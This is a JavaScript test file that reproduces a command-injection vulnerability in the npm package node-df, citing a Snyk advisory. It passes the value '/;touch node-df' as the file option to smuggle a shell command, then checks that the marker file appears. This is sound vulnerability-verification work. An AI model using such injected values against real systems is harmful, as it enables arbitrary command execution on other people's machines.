//https://snyk.io/vuln/SNYK-JS-NODEDF-536779
test("Command Injection in node-df", () => {
  const df = require("node-df");
  const fs = require("fs");
  const path = "./node-df";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let options = {
    file: "/;touch node-df",
    prefixMultiplier: "GB",
    isDisplayPrefixMultiplier: true,
    precision: 2,
  };
  df(options, function (error, response) {});
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
